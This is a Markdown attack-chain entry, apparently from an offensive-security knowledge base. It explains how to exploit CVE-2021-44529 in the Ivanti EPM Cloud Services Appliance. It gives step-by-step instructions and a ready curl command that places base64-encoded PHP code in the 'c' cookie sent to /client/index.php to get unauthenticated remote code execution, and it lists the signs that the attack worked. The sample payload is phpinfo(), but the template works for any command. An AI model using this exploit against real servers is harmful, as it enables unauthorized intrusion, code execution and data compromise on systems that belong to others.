---
id: ac-ivanti-rce-cookie-injection
tags:
  - rce
  - code-injection
  - php
  - ivanti
  - web
  - cve-2021-44529
type: attack_chain
tools:
  - '[[tools/Burp-Repeater]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Ivanti-EPM-CSA-Code-Injection-via-Cookies]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:41.116Z'
description: >-
  Exploit a code injection vulnerability in Ivanti EPM Cloud Services Appliance
  (CVE-2021-44529) to achieve unauthenticated remote code execution by injecting
  Base64-encoded PHP commands into cookies.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Unauthenticated RCE in Ivanti EPM CSA via Base64-Encoded PHP Code Injection in Cookies

Multi-stage attack chain demonstrating exploitation of CVE-2021-44529 in Ivanti EPM Cloud Services Appliance for unauthenticated remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Web Request] --> B[Code Execution]
    B --> C[Data Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Repeater]]

### Target Environment

- Web platform running vulnerable Ivanti EPM CSA (pre-2021 patch)
- PHP-enabled web server
- Accessible /client/index.php endpoint

### Initial Access Requirements

- Network access to the target server (no authentication required)
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Exploit Code Injection
procedure: [[procedures/Exploit-Ivanti-EPM-CSA-Code-Injection-via-Cookies]]

**Objective**: Inject Base64-encoded PHP code into cookies to execute arbitrary commands on the server as 'nobody' user, demonstrating RCE and potential data compromise.

**Instructions**: Identify the vulnerable Ivanti EPM CSA server and craft an HTTP GET request to /client/index.php. Use [[tools/Burp-Repeater]] or [[commands/curl-inject-php-cookie]] to set the 'c' cookie with Base64-encoded PHP code, such as for [[commands/phpinfo-display]] to verify execution.

First, encode the PHP command (e.g., phpinfo();) to Base64: `echo -n 'phpinfo();' | base64` outputs `cGhwaW5mbygpOw==`.

Then send the request using [[commands/curl-inject-php-cookie]]:

```bash
curl -X GET "http://target-ip/client/index.php" -H "Cookie: c=cGhwaW5mbygpOw==; ab=ab; d=; e=;"
```

**Expected Output**: The server responds with PHP configuration information, confirming code execution.

**Success Indicators**:
- PHP info page or executed command output in the HTTP response
- No authentication prompts; request succeeds unauthenticated

## Attack Chain Summary

### Key Achievements

1. Achieved unauthenticated RCE on Ivanti EPM CSA without credentials
2. Demonstrated arbitrary PHP code execution via cookie injection
3. Highlighted potential for server data compromise and further persistence

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
